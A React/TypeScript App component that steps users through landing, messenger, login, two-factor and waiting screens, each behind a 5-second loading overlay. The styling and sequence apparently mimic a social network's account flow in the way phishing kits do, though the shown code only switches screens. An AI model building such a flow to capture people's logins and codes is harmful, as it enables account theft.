import React, { useState, useCallback } from 'react';
import Screen1_Landing from './components/Screen1_Landing';
import Screen2_Messenger from './components/Screen2_Messenger';
import Screen3_Login from './components/Screen3_Login';
import Screen4_2FA from './components/Screen4_2FA';
import Screen5_Waiting from './components/Screen5_Waiting';
import LoadingOverlay from './components/LoadingOverlay';

const App: React.FC = () => {
  const [step, setStep] = useState<number>(1);
  const [isLoading, setIsLoading] = useState<boolean>(false);

  const handleNextStep = useCallback(() => {
    setIsLoading(true);
    setTimeout(() => {
      setStep((prevStep) => prevStep + 1);
      setIsLoading(false);
    }, 5000);
  }, []);

  const renderStep = () => {
    switch (step) {
      case 1:
        return <Screen1_Landing onNext={handleNextStep} />;
      case 2:
        return <Screen2_Messenger onNext={handleNextStep} />;
      case 3:
        return <Screen3_Login onNext={handleNextStep} />;
      case 4:
        return <Screen4_2FA onNext={handleNextStep} />;
      case 5:
        return <Screen5_Waiting />;
      default:
        return <Screen1_Landing onNext={handleNextStep} />;
    }
  };

  return (
    <div className="bg-[#F0F2F5] min-h-screen">
      {isLoading && <LoadingOverlay />}
      {renderStep()}
    </div>
  );
};

export default App;